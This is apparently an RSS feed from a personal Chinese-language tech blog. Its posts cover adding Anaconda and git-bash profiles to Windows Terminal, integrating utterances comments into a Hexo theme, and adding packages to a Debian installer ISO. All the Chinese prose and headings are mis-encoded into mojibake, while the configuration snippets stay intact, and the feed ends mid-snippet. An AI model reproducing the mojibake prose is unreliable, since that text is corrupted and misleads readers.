<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Roman&#39;s blog</title>
    <link>http://romanarcher.github.io/</link>
    
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description></description>
    <pubDate>Fri, 01 Apr 2022 12:46:21 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>Windows_terminalæ·»åŠ anacondaçš„shellç¯å¢ƒ</title>
      <link>http://romanarcher.github.io/post/d47ad02c.html</link>
      <guid>http://romanarcher.github.io/post/d47ad02c.html</guid>
      <pubDate>Fri, 01 Apr 2022 12:44:26 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;å°†Anaconda-Powershellæ·»åŠ åˆ°terminal&quot;&gt;&lt;a href=&quot;#å°†Anaconda-Powershellæ·»åŠ åˆ°terminal&quot; class=&quot;headerlink&quot; title=&quot;å°†Anaconda Powershellæ·»åŠ åˆ°termina
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="å°†Anaconda-Powershellæ·»åŠ åˆ°terminal"><a href="#å°†Anaconda-Powershellæ·»åŠ åˆ°terminal" class="headerlink" title="å°†Anaconda Powershellæ·»åŠ åˆ°terminal"></a>å°†Anaconda Powershellæ·»åŠ åˆ°terminal</h2><hr><p>æœ€è¿‘éœ€è¦ä½¿ç”¨anacondaï¼Œanacondaåªæä¾›äº†Anaconda Powershell Prompt (anaconda)ã€‚ç„¶è€Œæˆ‘ä¸€èˆ¬éƒ½æ˜¯ä½¿ç”¨terminalã€‚å› æ­¤æ€ä¹ˆå°†Anaconda Powershell Prompt (anaconda)é›†æˆåˆ°terminalé‡Œé¢å‘¢ï¼Ÿä¹‹å‰æˆ‘åšè¿‡å°†git-bashé›†æˆåˆ°terminalï¼ŒåŸç†æ˜¯ç›¸ä¼¼çš„ã€‚</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>å³é”®Anaconda Powershell Prompt (anaconda)é€‰æ‹©å±æ€§å¯ä»¥åœ¨ç›®æ ‡é‚£ä¸€é¡¹é‡Œé¢çœ‹åˆ°</p><pre><code>%windir%\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy ByPass -NoExit -Command &quot;&amp; &#39;D:\anaconda\shell\condabin\conda-hook.ps1&#39; ; conda activate &#39;D:\anaconda&#39; &quot;</code></pre><p>å¯ä»¥çœ‹åˆ°å…¶æœ¬è´¨åªæ˜¯ä¸ªpowershellå¸¦äº†ä¸€äº›å‚æ•°è€Œå·²ã€‚å› æ­¤ä¿®æ”¹ä¸‹é…ç½®å³å¯ã€‚</p><h3 id="ä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#ä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>ä¿®æ”¹é…ç½®æ–‡ä»¶</h3><p>åœ¨profilesçš„listä¸‹æ·»åŠ å¦‚ä¸‹é…ç½®</p><pre><code class="json">{    &quot;colorScheme&quot;: &quot;Solarized Dark - Patched&quot;,    &quot;commandline&quot;: &quot;%windir%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy ByPass -NoExit -Command \&quot;&amp; &#39;D:\\anaconda\\shell\\condabin\\conda-hook.ps1&#39; ; conda activate &#39;D:\\anaconda&#39; \&quot;&quot;,    &quot;guid&quot;: &quot;{6bb82228-0109-f6bf-e4da-9cdcd6c3d9c9}&quot;,    &quot;hidden&quot;: false,    &quot;icon&quot;: &quot;D:\\anaconda\\Menu\\anaconda-navigator.ico&quot;,    &quot;name&quot;: &quot;anaconda&quot;,    &quot;useAcrylic&quot;: true},</code></pre><p>commandlineå­—æ®µå¡«å†™ä¹‹å‰çœ‹åˆ°çš„å³å¯ã€‚iconæˆ‘ç”¨çš„æ˜¯anaconda-navigatorçš„å›¾æ ‡ã€‚</p><h3 id="åŒç†å¯å¾—"><a href="#åŒç†å¯å¾—" class="headerlink" title="åŒç†å¯å¾—"></a>åŒç†å¯å¾—</h3><p>visual studioæä¾›çš„x86 Native Tools Command Promptä¹‹ç±»çš„ä¸œè¥¿ä¹Ÿæ˜¯ç›¸åŒçš„åŸç†ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ·»åŠ è¿›å»ã€‚</p><h3 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h3><p><img src="https://raw.githubusercontent.com/RomanArcher/mypicgoimg/main/img/20220401204208.gif" alt></p>]]></content:encoded>
      
      <comments>http://romanarcher.github.io/post/d47ad02c.html#disqus_thread</comments>
    </item>
    
    <item>
      <title>Windows_terminalæ·»åŠ git-bash</title>
      <link>http://romanarcher.github.io/post/6ec0946f.html</link>
      <guid>http://romanarcher.github.io/post/6ec0946f.html</guid>
      <pubDate>Thu, 23 Jul 2020 05:52:32 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;å°†git-bashæ·»åŠ åˆ°terminal&quot;&gt;&lt;a href=&quot;#å°†git-bashæ·»åŠ åˆ°terminal&quot; class=&quot;headerlink&quot; title=&quot;å°†git-bashæ·»åŠ åˆ°terminal&quot;&gt;&lt;/a&gt;å°†git-bashæ·»åŠ åˆ°terminal&lt;/h2&gt;&lt;
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="å°†git-bashæ·»åŠ åˆ°terminal"><a href="#å°†git-bashæ·»åŠ åˆ°terminal" class="headerlink" title="å°†git-bashæ·»åŠ åˆ°terminal"></a>å°†git-bashæ·»åŠ åˆ°terminal</h2><hr><h3 id="æ‰“å¼€terminalçš„é…ç½®æ–‡ä»¶"><a href="#æ‰“å¼€terminalçš„é…ç½®æ–‡ä»¶" class="headerlink" title="æ‰“å¼€terminalçš„é…ç½®æ–‡ä»¶"></a>æ‰“å¼€terminalçš„é…ç½®æ–‡ä»¶</h3><p><img src="https://raw.githubusercontent.com/RomanArcher/mypicgoimg/master/img/20200723113047.gif" alt></p><h3 id="ä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#ä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>ä¿®æ”¹é…ç½®æ–‡ä»¶</h3><p>åœ¨profilesçš„listä¸‹æ·»åŠ å¦‚ä¸‹é…ç½®</p><pre><code class="json">{    &quot;guid&quot;: &quot;{702c9cad-9f9d-c7d6-bab1-bcd1fca08dcb}&quot;,    &quot;colorScheme&quot;: &quot;Solarized Dark - Patched&quot;,    &quot;name&quot;: &quot;bash&quot;,    &quot;commandline&quot;: &quot;C:\\Program Files\\Git\\bin\\bash.exe&quot;,    &quot;startingDirectory&quot;: &quot;%USERPROFILE%&quot;,    &quot;historySize&quot;: 9001,    &quot;closeOnExit&quot;: true,    &quot;icon&quot;: &quot;C:\\Program Files\\Git\\mingw64\\share\\git\\git-for-windows.ico&quot;,    &quot;hidden&quot;: false},</code></pre><p>guid:è‡ªå·±ç”Ÿæˆä¸€ä¸ªå’Œå…¶ä»–ä¸åŒçš„å³å¯<br>commandlie:bash.exeçš„ä½ç½®<br>icon:gitçš„å›¾æ ‡ä½ç½®ï¼Œå¯æœ‰å¯æ— ã€‚</p><h3 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h3><p><img src="https://raw.githubusercontent.com/RomanArcher/mypicgoimg/master/img/20200723134937.gif" alt></p><h2 id="gitbashå‡ºç°ä¸­æ–‡ä¹±ç "><a href="#gitbashå‡ºç°ä¸­æ–‡ä¹±ç " class="headerlink" title="gitbashå‡ºç°ä¸­æ–‡ä¹±ç "></a>gitbashå‡ºç°ä¸­æ–‡ä¹±ç </h2><p>åœ¨git/etc/bash.bashrcä¸‹æ·»åŠ </p><pre><code class="bash">export LANG=&quot;zh_CN.UTF-8&quot;export LC_ALL=&quot;zh_CN.UTF-8&quot;</code></pre>]]></content:encoded>
      
      <comments>http://romanarcher.github.io/post/6ec0946f.html#disqus_thread</comments>
    </item>
    
    <item>
      <title>hexoä¸»é¢˜materialé…ç½®</title>
      <link>http://romanarcher.github.io/post/420927fd.html</link>
      <guid>http://romanarcher.github.io/post/420927fd.html</guid>
      <pubDate>Wed, 15 Jul 2020 07:06:32 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;hexoæ›´æ¢materialä¸»é¢˜&quot;&gt;&lt;a href=&quot;#hexoæ›´æ¢materialä¸»é¢˜&quot; class=&quot;headerlink&quot; title=&quot;hexoæ›´æ¢materialä¸»é¢˜&quot;&gt;&lt;/a&gt;hexoæ›´æ¢materialä¸»é¢˜&lt;/h2&gt;&lt;h3 id=&quot;é¡¹ç›®é¡µé¢&quot;&gt;&lt;a 
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="hexoæ›´æ¢materialä¸»é¢˜"><a href="#hexoæ›´æ¢materialä¸»é¢˜" class="headerlink" title="hexoæ›´æ¢materialä¸»é¢˜"></a>hexoæ›´æ¢materialä¸»é¢˜</h2><h3 id="é¡¹ç›®é¡µé¢"><a href="#é¡¹ç›®é¡µé¢" class="headerlink" title="é¡¹ç›®é¡µé¢"></a>é¡¹ç›®é¡µé¢</h3><p><a href="https://github.com/bolnh/hexo-theme-material" target="_blank" rel="noopener">hexoçš„materialä¸»é¢˜é¡¹ç›®é¡µé¢</a></p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>å®‰è£…æ–¹æ³•å¾ˆç®€å•ï¼ŒæŠŠé¡¹ç›®æ–‡ä»¶æ”¾åˆ°themesç›®å½•ä¸‹ï¼Œä¿®æ”¹hexoçš„_config.ymlä¸­çš„themeä¸ºå¯¹åº”æ–‡ä»¶å¤¹çš„åå­—å³å¯ã€‚<br>å› æ­¤ï¼Œå¯ä»¥ä¸‹è½½releaseåŒ…ï¼Œæˆ–è€…è¿›å…¥themeçš„ç›®å½•git cloneã€‚<br>ä½†æ˜¯æœ€æ–°çš„ç‰ˆæœ¬æˆ‘ä¸€ç›´ç”Ÿæˆä¸äº†ç½‘é¡µï¼Œå› æ­¤æˆ‘é€‰æ‹©äº†è€ç‰ˆæœ¬çš„releaseåŒ…ã€‚</p><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>materialä¸ºäº†æ›´æ–°ä¸å½±å“ç”¨æˆ·è‡ªå·±çš„é…ç½®ï¼Œå› æ­¤å…¶é…ç½®æ ·æ¿æ–‡ä»¶ä¸º_config.template.ymlã€‚<br>å°†_config.template.ymlæ‹·è´ä¸€ä»½å¹¶ä¸”é‡å‘½åä¸º_config.ymlï¼Œ_config.ymlå³ä¸ºç”¨æˆ·è‡ªå·±çš„é…ç½®æ–‡ä»¶ã€‚</p><h2 id="materialé…ç½®utteranc"><a href="#materialé…ç½®utteranc" class="headerlink" title="materialé…ç½®utteranc"></a>materialé…ç½®utteranc</h2><p>å› ä¸ºæˆ‘æƒ³ä½¿ç”¨githubçš„issueæ¥å½“è¯„è®ºæ ï¼Œå¸¸ç”¨çš„æœ‰gitmentå’Œgitalkï¼Œä½†ä¼¼ä¹æœ‰ç‚¹ä¸å¤ªå®‰å…¨ã€‚<br><a href="https://www.v2ex.com/t/535608" target="_blank" rel="noopener">v2ex-å»ºè®®å¤§å®¶å¼ƒç”¨ Gitalk å’Œ Gitment ç­‰æƒé™è¿‡é«˜çš„ Github OAuth App</a></p><p>è¿™é‡Œæˆ‘ä»¬æ”¹ç”¨utterancã€‚å…¶æƒé™åˆ’åˆ†ç²’åº¦æ›´ç»†ã€‚</p><h3 id="1-å®‰è£…utterancç”Ÿæˆç›¸åº”é…ç½®"><a href="#1-å®‰è£…utterancç”Ÿæˆç›¸åº”é…ç½®" class="headerlink" title="1.å®‰è£…utterancç”Ÿæˆç›¸åº”é…ç½®"></a>1.å®‰è£…utterancç”Ÿæˆç›¸åº”é…ç½®</h3><p>å®‰è£…utterancåº”ç”¨ <a href="https://github.com/apps/utterancesã€‚" target="_blank" rel="noopener">https://github.com/apps/utterancesã€‚</a><br>æŒ‡å®šä½ è¦å­˜å‚¨è¯„è®ºçš„ä»“åº“ï¼Œå°±æ˜¯.github.ioé‚£ä¸ªé¡¹ç›®å°±è¡Œã€‚<br>åˆ°<a href="https://utteranc.es/ï¼Œå¡«å†™é…ç½®ï¼Œç„¶åä»–ä¼šç»™ä½ ç”Ÿæˆä¸€æ®µscriptã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š" target="_blank" rel="noopener">https://utteranc.es/ï¼Œå¡«å†™é…ç½®ï¼Œç„¶åä»–ä¼šç»™ä½ ç”Ÿæˆä¸€æ®µscriptã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š</a></p><pre><code class="html">&lt;script src=&quot;https://utteranc.es/client.js&quot;        repo=&quot;xxx/xxx.github.io&quot;        issue-term=&quot;pathname&quot;        label=&quot;comment&quot;        theme=&quot;github-light&quot;        crossorigin=&quot;anonymous&quot;        async&gt;&lt;/script&gt;</code></pre><h3 id="2-å°†utterancé›†æˆåˆ°material"><a href="#2-å°†utterancé›†æˆåˆ°material" class="headerlink" title="2.å°†utterancé›†æˆåˆ°material"></a>2.å°†utterancé›†æˆåˆ°material</h3><p>å› ä¸ºæˆ‘å¹¶ä¸ä¼šå‰ç«¯ï¼Œæ‰€ä»¥å®ç°çš„æ–¹å¼å¯èƒ½ä¸å¤ªä¼˜é›…ã€‚<br>é¦–å…ˆé€šè¿‡é˜…è¯»ç›¸å…³çš„ä»£ç å¯ä»¥å‘ç°ã€‚<br>/themes/material/layout/_partialä¸‹æœ‰ä¸ªcomment.ejsæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><pre><code class="html">&lt;% if(theme.comment.use) { %&gt;    &lt;%- partial(&#39;_widget/comment/&#39; + theme.comment.use + &#39;/enter&#39;) %&gt;&lt;% } %&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°çœŸæ­£çš„å®ç°åœ¨/themes/material/layout/_widget/commentç›®å½•ä¸‹ã€‚<br>åœ¨/themes/material/layout/_widget/commentç›®å½•ä¸‹å¯ä»¥çœ‹åˆ°changyanã€disqusã€disqus_clikã€gitmentã€livereã€valineè¿™å‡ ä¸ªæ–‡ä»¶å¤¹ï¼Œçœ‹æ¥materialåº”è¯¥æ˜¯æ”¯æŒè¿™å‡ ç§è¯„è®ºæ’ä»¶ã€‚</p><p>æˆ‘ä»¬ç›´æ¥ä¾è‘«èŠ¦ç”»ç“¢å¤åˆ¶ä¸‹gitmentçš„æ–‡ä»¶å¤¹ï¼Œé‡å‘½åä¸ºutterancã€‚<br>æ–‡ä»¶å¤¹ä¸‹æœ‰ä¸‰ä¸ªæ–‡ä»¶ã€‚<br>æˆ‘ç¨å¾®æ”¹äº†ä¸€äº›ä¸œè¥¿ï¼Œå…·ä½“çš„ä¿¡æ¯å¦‚ä¸‹ï¼š</p><pre><code class="html">common.ejs&lt;!-- utteranc --&gt;enter.ejs&lt;!-- ä½¿ç”¨ utteranc --&gt;&lt;div id=&quot;utteranc-comment&quot;&gt;    &lt;%- partial(&#39;_widget/comment/&#39; + theme.comment.use + &#39;/main&#39;) %&gt;&lt;/div&gt;&lt;script src=&quot;https://utteranc.es/client.js&quot;        repo= &#39;&lt;%= theme.comment.utteranc_repo%&gt;&#39;        issue-term=&#39;&lt;%= theme.comment.utteranc_issue_term%&gt;&#39;        label=&#39;&lt;%= theme.comment.utteranc_label%&gt;&#39;        theme=&#39;&lt;%= theme.comment.utteranc_theme%&gt;&#39;        crossorigin=&quot;anonymous&quot;        async&gt;&lt;/script&gt;main.ejs&lt;!-- Utteranc è¯„è®ºæ¡† --&gt;</code></pre><p>å½“ç„¶ä½ å¯ä»¥ç›´æ¥æŠŠç”Ÿæˆçš„é…ç½®å†™åœ¨enter.ejsä¸­ï¼Œä¸è¿‡æˆ‘è¿˜æ˜¯æ›´ç»†åŒ–å¯é…ç½®çš„å½¢å¼ã€‚<br>å¦‚æœä½ æ˜¯ç›´æ¥ç²˜è´´çš„ç½‘ç«™ç”Ÿæˆçš„é…ç½®ï¼Œé‚£ä¹ˆå°±å®Œæˆäº†ã€‚<br>å¦‚æœä½ æ˜¯ç”¨çš„æˆ‘çš„ä¿®æ”¹ï¼Œé‚£ä¹ˆè¿˜éœ€è¦åœ¨materialçš„_config.ymlä¸­å¡«ä¸Šå¦‚ä¸‹ä¿¡æ¯ã€‚<br>å½“ç„¶ä½ çš„é…ç½®å’Œæˆ‘çš„è‚¯å®šä¸ä¸€æ ·ã€‚</p><pre><code class="yml">comment:    use: utteranc    utteranc_repo: xxxx/xxxx.github.io    utteranc_issue_term: pathname    utteranc_label: commentâœ¨ğŸ’¬âœ¨    utteranc_theme: github-light</code></pre><p>æ¥ä¸‹æ¥hexo clean,hexo g,hexo sã€‚çœ‹çœ‹æ˜¯å¦æœ‰è¯„è®ºæ äº†å§ã€‚</p>]]></content:encoded>
      
      <comments>http://romanarcher.github.io/post/420927fd.html#disqus_thread</comments>
    </item>
    
    <item>
      <title>åœ¨Debianå®‰è£…é•œåƒä¸­æ·»åŠ è½¯ä»¶åŒ…</title>
      <link>http://romanarcher.github.io/post/5092e38f.html</link>
      <guid>http://romanarcher.github.io/post/5092e38f.html</guid>
      <pubDate>Wed, 13 Nov 2019 08:09:12 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h2&gt;&lt;p&gt;æœ¬æ•™ç¨‹æ˜¯åœ¨ubuntu16.04 desktop amd64ä¸Šè¿›è¡Œç¼–è¾‘ã€‚&lt;br&gt;é•œåƒä¸ºdebian-10.1.0-amd64-xfce-CD
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>æœ¬æ•™ç¨‹æ˜¯åœ¨ubuntu16.04 desktop amd64ä¸Šè¿›è¡Œç¼–è¾‘ã€‚<br>é•œåƒä¸ºdebian-10.1.0-amd64-xfce-CD-1ã€‚<br>ä¸Šä¸€ä¸ªæ•™ç¨‹æ ¹æ®Ubuntu wikiä¸Šçš„å®šåˆ¶isoæ–¹æ³•ä¸€æ­¥ä¸€æ­¥åˆ¶ä½œçš„ï¼Œè¿™æ¬¡æˆ‘å°†å°½é‡ç®€åŒ–æ­¥éª¤ï¼Œä»¥åŠè¡¥å……ç›¸å…³çš„è¯´æ˜ã€‚</p><p>å‚è€ƒåœ°å€ï¼š<br><a href="https://wiki.debian.org/DebianInstaller/Modify/CD" target="_blank" rel="noopener">debian wiki-modify CD</a><br><a href="https://wiki.debian.org/DebianCustomCD" target="_blank" rel="noopener">debian wiki-customCD</a><br><a href="https://wiki.debian.org/DebianInstaller/Preseed#Default_preseed_files" target="_blank" rel="noopener">debianinstaller preseed</a><br><a href="https://wiki.debian.org/DebianInstaller/Preseed/EditIso" target="_blank" rel="noopener">preseeding the installer from its initrd</a></p><h2 id="1-è§£å‹é•œåƒ"><a href="#1-è§£å‹é•œåƒ" class="headerlink" title="1.è§£å‹é•œåƒ"></a>1.è§£å‹é•œåƒ</h2><p>å’ŒUbuntuçš„ä¸€è‡´<br>æŒ‚è½½é•œåƒ</p><pre><code class="bash">mount -o loop $isopath $mountpoint</code></pre><p>ä½¿ç”¨rsyncå¤åˆ¶æ–‡ä»¶åˆ°ç¡¬ç›˜</p><pre><code class="bash">rsync -av $mountpoint $imagepath</code></pre><p>æˆ–è€…ç›´æ¥ä½¿ç”¨cpå‘½ä»¤æ‹·è´</p><pre><code class="bash">mkdir -p $imagepathcp -a $mountpoint $imagepath</code></pre><p>ä¹Ÿå¯ä»¥ç›´æ¥å°†isoè§£å‹</p><pre><code class="bash">bsdtar -C $imagepath -xf debian-10.1.0-amd64-xfce-CD-1.iso</code></pre><h2 id="2-æ·»åŠ debåŒ…"><a href="#2-æ·»åŠ debåŒ…" class="headerlink" title="2.æ·»åŠ debåŒ…"></a>2.æ·»åŠ debåŒ…</h2><p>è¿™æ¬¡æˆ‘æ‡’å¾—åˆ›å»ºextrasç»„ä»¶äº†ï¼Œç›´æ¥æŠŠdebæ”¾åˆ°pool/mainç›¸åº”çš„æ–‡ä»¶å¤¹ä¸‹ï¼Œä¸ºäº†ç¾è§‚ä»¥åŠå‡å°‘å‡ºç°ä¸å¯é¢„çŸ¥çš„bugï¼Œæˆ‘é‡‡å–äº†å’Œå…¶å®ƒdebåŒ…ç›¸åŒçš„ç»“æ„ï¼Œæ¯”å¦‚æˆ‘çš„è½¯ä»¶ä»¥å­—æ¯så¼€å¤´ï¼Œå°±æ”¾åœ¨äº†pool/main/s/è½¯ä»¶å/ä¸‹é¢ã€‚</p><h2 id="3-é‡æ–°ç”ŸæˆPakageså’ŒReleaseæ–‡ä»¶"><a href="#3-é‡æ–°ç”ŸæˆPakageså’ŒReleaseæ–‡ä»¶" class="headerlink" title="3.é‡æ–°ç”ŸæˆPakageså’ŒReleaseæ–‡ä»¶"></a>3.é‡æ–°ç”ŸæˆPakageså’ŒReleaseæ–‡ä»¶</h2><p>ä»ç½‘ä¸Šä¸‹è½½indicesä¼¼ä¹æ˜¯æ²¡æœ‰å¿…è¦çš„ï¼Œæˆ‘åªåœ¨mainä»“åº“ä¸‹æ·»åŠ äº†åŒ…ï¼Œå› æ­¤åªéœ€è¦ä¿®æ”¹ç›¸åº”çš„æ–‡ä»¶å°±è¡Œï¼Œæ‰‹åŠ¨ä¿®æ”¹å¤ªéº»çƒ¦ï¼Œè¿™é‡Œä½¿ç”¨apt-ftparchiveã€‚é…ç½®æ–‡ä»¶å¦‚ä¸‹</p><p>apt-ftparchive-deb.conf</p><pre><code class="bash">Dir {  ArchiveDir &quot;$imagepath&quot;;};TreeDefault {  Directory &quot;pool/&quot;;};BinDirectory &quot;pool/main&quot; {  Packages &quot;dists/$DIST/main/binary-amd64/Packages&quot;;};BinDirectory &quot;pool/contrib&quot; { Packages &quot;dists/$DIST/contrib/binary-amd64/Packages&quot;;};Default {  Packages {    Extensions &quot;.deb&quot;;    Compress &quot;. gzip&quot;;  };};Contents {  Compress &quot;gzip&quot;;};</code></pre><p>release .conf</p><pre><code class="bash">APT::FTPArchive::Release::Codename &quot;$DIST&quot;;APT::FTPArchive::Release::Origin &quot;Debian&quot;;APT::FTPArchive::Release::Components &quot;main&quot;;APT::FTPArchive::Release::Label &quot;Debian&quot;;APT::FTPArchive::Release::Architectures &quot;amd64&quot;;APT::FTPArchive::Release::Suite &quot;testing&quot;;</code></pre><p>å…ˆæ„å»ºPackage</p><pre><code class="bash">apt-ftparchive generate apt-ftparchive-deb.conf</code></pre><p>è¿™ä¸ªæ—¶å€™ä¼šæ‰«æpool/mianä¸‹é¢çš„è½¯ä»¶åŒ…ç„¶åå°†ä¿¡æ¯å†™å…¥dists/$DIST/main/binary-amd64/Packages<br>åœ¨apt-ftparchive-deb.confé…ç½®ä¸­ä½“ç°</p><pre><code class="bash">BinDirectory &quot;pool/main&quot; {  Packages &quot;dists/$DIST/main/binary-amd64/Packages&quot;;};</code></pre><p>Packageså†…ä¿å­˜äº†debçš„ä¿¡æ¯ï¼ˆä¹Ÿå°±æ˜¯debåŒ…æ„å»ºæ—¶ï¼Œcontrolé‡Œé¢çš„ä¿¡æ¯ï¼‰ã€debåŒ…çš„ä½ç½®ã€debåŒ…çš„å¤§å°ä»¥åŠmd5ä¹‹ç±»éªŒè¯å€¼ã€‚</p><p>ç”ŸæˆReleaseæ–‡ä»¶</p><pre><code class="bash">apt-ftparchive release $imagepath/dists/$DIST &gt;&gt; $imagepath/dists/$DIST/Release</code></pre><p>Releaseæ–‡ä»¶æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯ä¸€äº›æè¿°æ–‡ä»¶ï¼Œå’ŒPakageæ–‡ä»¶ä»¥åŠç¿»è¯‘æ–‡ä»¶çš„ä½ç½®å’Œmd5ä¹‹ç±»çš„éªŒè¯ä¿¡æ¯ï¼ˆæœ‰MD5ã€sha1ã€sha256ã€sha512ï¼‰ã€‚</p><pre><code class="bash">Architectures: amd64Codename: busterComponents: mainDate: Tue, 12 Nov 2019 09:09:47 UTCLabel: DebianOrigin: DebianSuite: testingMD5Sum: b5529ca7f3228f4c06507cc9becfaf7a              135 Release d41d8cd98f00b204e9800998ecf8427e                0 contrib/binary-amd64/Packages e62ff0123a74adfc6903d59a449cbdb0               40 contrib/binary-amd64/Packages.gz e5e5d8f8688a49f7836b62b0f605b694              119 contrib/binary-amd64/Release 040f7f5196ce62a26b596e10fe0c924e          1246183 main/binary-amd64/Packages fb9b1a586d9c0e6f639ffee5e186fbc4           414562 main/binary-amd64/Packages.gz dd30475d155e4b1beab9c1b8d7d1d703              116 main/binary-amd64/Release 600f266567b08466e6c2e46f6f2a4856            40987 main/debian-installer/binary-amd64/Packages.gz dd30475d155e4b1beab9c1b8d7d1d703              116 main/debian-installer/binary-amd64/Release 4e0f08499f56c7a4da3ef2a02749d657             2950 main/i18n/Translation-ca.gz b19a6ca7c0521247707371291a5d7a04            47191 main/i18n/Translation-cs.gz...#ä¸‹é¢çš„å°±ä¸æ”¾å‡ºæ¥äº†</code></pre><h2 id="4-æ·»åŠ preseed-cfg"><a href="#4-æ·»åŠ preseed-cfg" class="headerlink" title="4.æ·»åŠ preseed.cfg"></a>4.æ·»åŠ preseed.cfg</h2><p>æŒ‰ç…§æˆ‘çš„æƒ³æ³•éƒ½å·²ç»æ”¾å…¥äº†miané‡Œé¢äº†ï¼Œè¿˜æŠŠä¿¡æ¯å†™å…¥äº†Packageï¼Œåº”è¯¥ä¼šè‡ªåŠ¨å®‰è£…ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ï¼Œçœ‹æ¥å®‰è£…ç³»ç»Ÿåœ¨å…¶ä»–åœ°æ–¹è‡ªå·±ç»´æŠ¤äº†ä¸€ä¸ªå®‰è£…åˆ—è¡¨ï¼Œå½“ç„¶æˆ‘ä»¬å¯ä»¥æ‰¾æ‰¾ä¿®æ”¹initrdçš„æ–¹æ³•ï¼Œä½†æ˜¯debian-installeræä¾›äº†preseedçš„æœºåˆ¶æˆ‘ä»¬å°±ä½¿ç”¨è¿™ä¸ªå§ã€‚</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°Debiançš„ç›®å½•ä¸‹å¹¶æ²¡æœ‰Ubuntuä¸€æ ·çš„preseedæ–‡ä»¶å¤¹ã€‚<br>debianå’ŒUbuntuç›®å½•å±•ç¤º</p><pre><code class="bash">#debian.â”œâ”€â”€ autorun.infâ”œâ”€â”€ bootâ”œâ”€â”€ cssâ”œâ”€â”€ debian -&gt; .â”œâ”€â”€ distsâ”œâ”€â”€ docâ”œâ”€â”€ EFIâ”œâ”€â”€ firmwareâ”œâ”€â”€ g2ldrâ”œâ”€â”€ g2ldr.mbrâ”œâ”€â”€ installâ”œâ”€â”€ install.amdâ”œâ”€â”€ isolinuxâ”œâ”€â”€ md5sum.txtâ”œâ”€â”€ picsâ”œâ”€â”€ poolâ”œâ”€â”€ README.htmlâ”œâ”€â”€ README.mirrors.htmlâ”œâ”€â”€ README.mirrors.txtâ”œâ”€â”€ README.sourceâ”œâ”€â”€ README.txtâ”œâ”€â”€ setup.exeâ”œâ”€â”€ toolsâ””â”€â”€ win32-loader.ini#Ubuntu.â”œâ”€â”€ bootâ”œâ”€â”€ distsâ”œâ”€â”€ docâ”œâ”€â”€ EFIâ”œâ”€â”€ installâ”œâ”€â”€ isolinuxâ”œâ”€â”€ md5sum.txtâ”œâ”€â”€ picsâ”œâ”€â”€ poolâ”œâ”€â”€ preseedâ”œâ”€â”€ README.diskdefinesâ””â”€â”€ ubuntu -&gt; .</code></pre><p>å¦‚ä½•ç¡®å®špressedå…¶å®æ˜¯åœ¨isoliuuxç›®å½•ä¸‹çš„cfgæ–‡ä»¶ç¡®å®šï¼Œcfgé—´ç›¸äº’å¼•ç”¨å…¨å¼„æ˜ç™½å…¶å®æŒºéº»çƒ¦çš„ï¼Œè¿™é‡Œæˆ‘ç»™å‡ºæˆ‘æ‰¾åˆ°çš„cfgæ–‡ä»¶ï¼Œå°±æ˜¯isolinux/txt.cfg<br>cfgæ–‡ä»¶å¯¹æ¯”</p><pre><code class="bash">#debianlabel install    menu label ^Install    kernel /install.amd/vmlinuz    append desktop=xfce vga=788 initrd=/install.amd/initrd.gz --- quiet #ubuntudefault installlabel install  menu label ^Install Ubuntu Server  kernel /install/vmlinuz  append  file=/cdrom/preseed/ubuntu-server.seed vga=788 initrd=/install/initrd.gz quiet ---label hwe-install  menu label ^Install Ubuntu Server with the HWE kernel  kernel /install/hwe-vmlinuz  append  file=/cdrom/preseed/hwe-ubuntu-server.seed vga=788 initrd=/install/hwe-initrd.gz quiet ---label maas  menu label ^Install MAAS Region Controller  kernel /install/vmlinuz  append   modules=maas-region-udeb vga=788 initrd=/install/initrd.gz quiet ---label maasrack  menu label ^Install MAAS Rack Controller  kernel /install/vmlinuz  append   modules=maas-rack-udeb vga=788 initrd=/install/initrd.gz quiet ---label check  menu label ^Check disc for defects  kernel /install/vmlinuz  append   MENU=/bin/cdrom-checker-menu vga=788 initrd=/install/initrd.gz quiet ---label memtest  menu label Test ^memory  kernel /install/mt86pluslabel hd  menu label ^Boot from first hard disk  localboot 